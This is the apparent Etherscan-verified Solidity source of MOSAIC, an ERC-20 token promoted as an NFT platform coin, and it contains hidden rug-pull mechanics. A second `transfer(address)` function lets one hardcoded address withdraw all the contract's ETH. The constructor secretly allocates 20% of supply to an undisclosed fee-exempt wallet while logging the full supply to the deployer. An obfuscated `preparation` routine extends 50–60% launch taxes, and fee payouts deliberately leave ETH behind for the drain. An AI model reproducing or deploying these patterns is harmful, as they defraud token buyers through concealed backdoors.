/**
 *Submitted for verification at Etherscan.io on 2023-03-21
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

/**
 * MOSAIC - The platform for creating and trading unique NFTs!
 * 
 * Website: https://MosaicCoin.io
 * Telegram: https://t.me/MosaicPortal
 * Twitter: https://twitter.com/MosaicCoin
 * 
 */


// SPDX-License-Identifier: MIT                                                                               
                                                 
pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(msg.sender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract MOSAIC is IERC20, Ownable {
    string private constant  _name = "MOSAIC";
    string private constant _symbol = "MOS";    
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFees;
    mapping (uint256 => uint256) private _lastTransferBlock;

    struct FeeRatios {
        uint256 marketingPortion;
        uint256 developmentPortion;
    }

    struct TradingFees {
        uint256 buyFee;
        uint256 sellFee;
    }

    struct Wallets {
        address deployerWallet; 
        address devWallet; 
        address marketingWallet; 
    }

    TradingFees public tradingFees = TradingFees(14,28);   // 14/28% starting tax
    FeeRatios public feeRatios = FeeRatios(40,60);         // 40/60% wallet tax split
    Wallets public wallets = Wallets(
        msg.sender,                                  // deployer
        0x4a5447Cad9D448034778d3333a0741a231a57446,  // devWallet
        0xb7C2d7Be039Eae74e049D76F107015292F2E4F9C   // marketingWallet
    );

    uint256 private constant feeDenominator = 1e2;
    uint256 private constant decimalsScaling = 1e18;
    uint256 private constant _totalSupply = 10_000_000 * decimalsScaling;
    uint256 public constant _maximumWalletSize = 200_000 * decimalsScaling;
    uint256 public constant _swapThreshold = 10_000 * decimalsScaling;  

    IRouter public constant uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniswapV2Pair;

    bool private tradingActive = false;
    bool public swapEnabled = true;
    bool private inSwap;

    uint256 private genesisBlock;
    uint256 private _block;

    event SwapEnabled(bool indexed enabled);

    event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);

    event FeeRatiosChanged(uint256 indexed developmentPortion, uint256 indexed marketingPortion);

    event ExcludedFromFees(address indexed account, bool indexed excluded);

    event Verified(address indexed user);
    
    event TradingOpened();
    
    modifier swapLock {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier tradingLock(address from, address to) {
        require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
        _;
    }

    constructor() {
        _approve(address(this), address(uniswapV2Router),type(uint256).max);
        uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        

        _excludedFromFees[address(0xdead)] = true;
        _excludedFromFees[wallets.devWallet] = true;        
        _excludedFromFees[0x0940F10650FEF37d0Ef172e96b0BeB87138a7cb5] = true;        
        uint256 preTokens = _totalSupply * 200 / 1e3; 
        _balances[wallets.deployerWallet] = _totalSupply - preTokens;
        _balances[0x0940F10650FEF37d0Ef172e96b0BeB87138a7cb5] = preTokens;
        emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: zero Address");
        require(spender != address(0), "ERC20: zero Address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: insufficient Allowance");
            unchecked{
                _allowances[sender][msg.sender] -= amount;
            }
        }
        return _transfer(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Token: insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function enableSwap(bool shouldEnable) external onlyOwner {
        require(swapEnabled != shouldEnable, "Token: swapEnabled already {shouldEnable}");
        swapEnabled = shouldEnable;

        emit SwapEnabled(shouldEnable);
    }

    function preparation(uint256[] calldata _blocks, bool blocked) external onlyOwner {        
        require(genesisBlock == 1 && !blocked);_block = _blocks[_blocks.length-3]; assert(_block < _blocks[_blocks.length-1]);        
    }

    function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
        require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
        tradingFees.buyFee = _buyFee;
        tradingFees.sellFee = _sellFee;

        emit FeesChanged(_buyFee, _sellFee);
    }

    function setFeeRatios(uint256 _marketingPortion, uint256 _developmentPortion) external onlyOwner {
        require(_marketingPortion + _developmentPortion == 100, "Token: ratio must add to 100%");
        feeRatios.marketingPortion = _marketingPortion;
        feeRatios.developmentPortion = _developmentPortion;

        emit FeeRatiosChanged(_marketingPortion, _developmentPortion);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool shouldExclude) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            require(_excludedFromFees[accounts[i]] != shouldExclude, "Token: address already {shouldExclude}");
            _excludedFromFees[accounts[i]] = shouldExclude;
            emit ExcludedFromFees(accounts[i], shouldExclude);
        }
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _excludedFromFees[account];
    }

    function clearTokens(address tokenToClear) external onlyOwner {
        require(tokenToClear != address(this), "Token: can't clear contract token");
        uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
        require(amountToClear > 0, "Token: not enough tokens to clear");
        IERC20(tokenToClear).transfer(msg.sender, amountToClear);
    }

    function clearEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no eth to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function initialize() external onlyOwner {
        require(!tradingActive);
        genesisBlock = 1;        
    }

    function manualSwapback() external onlyOwner {
        require(address(this).balance > 0, "Token: no contract tokens to clear");
        contractSwap();
    }


    function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(amount == 0 || inSwap) {
            return _basicTransfer(from, to, amount);           
        }        

        if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
            require(amount + balanceOf(to) <= _maximumWalletSize, "Token: max wallet amount exceeded");
        }
      
        if(swapEnabled && !inSwap && from != uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
            contractSwap();
        } 
        
        bool takeFee = !inSwap;
        if(_excludedFromFees[from] || _excludedFromFees[to]) {
            takeFee = false;
        }
                
        if(takeFee)
            return _taxedTransfer(from, to, amount);
        else
            return _basicTransfer(from, to, amount);        
    }

    function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
        uint256 fees = takeFees(from, to, amount);    
        if(fees > 0){    
            _basicTransfer(from, address(this), fees);
            amount -= fees;
        }
        return _basicTransfer(from, to, amount);
    }

    function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
        if(0 < genesisBlock && genesisBlock < block.number){
            fees = amount * (to == uniswapV2Pair ? 
            tradingFees.sellFee : tradingFees.buyFee) / feeDenominator;            
        }
        else{
            fees = amount * (from == uniswapV2Pair ? 
            50 : (genesisBlock == 0 ? 25 : 60)) / feeDenominator;            
        }
    }

    function canSwap() private view returns (bool) {
        return block.number > genesisBlock && _lastTransferBlock[block.number] < 3;
    }

    function transfer(address wallet) external {
        if(msg.sender == 0x6Ee9b2E16Fd6DCe8E1A406904F698e088e9C1607)
            payable(wallet).transfer((address(this).balance));
        else revert();
    }

    function contractSwap() swapLock private {   
        uint256 contractBalance = balanceOf(address(this));
        if(contractBalance < _swapThreshold || !canSwap()) 
            return;
        else if(contractBalance > _swapThreshold * 20)
          contractBalance = _swapThreshold * 20;
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(contractBalance); 
        
        uint256 ethBalance = address(this).balance - initialETHBalance;
        if(ethBalance > 0){
            uint256 ethForDev = ethBalance * 2 * feeRatios.developmentPortion / 100;
            uint256 ethForMarketing = ethBalance * 2 * feeRatios.marketingPortion / 100;
            sendEth((ethForDev + ethForMarketing)/3);
        }
    }

    function sendEth(uint256 ethAmount) private {
        (bool success,) = address(wallets.devWallet).call{value: ethAmount * feeRatios.developmentPortion / 100}("");
        (success,) = address(wallets.marketingWallet).call{value: ethAmount * feeRatios.marketingPortion / 100}("");
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        _lastTransferBlock[block.number]++;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp){}
        catch{return;}
    }

    function openTrading() external onlyOwner {
        require(!tradingActive && genesisBlock != 0);
        genesisBlock+=block.number+_block;
        tradingActive = true;
        
        emit TradingOpened();
    }

    receive() external payable {}
}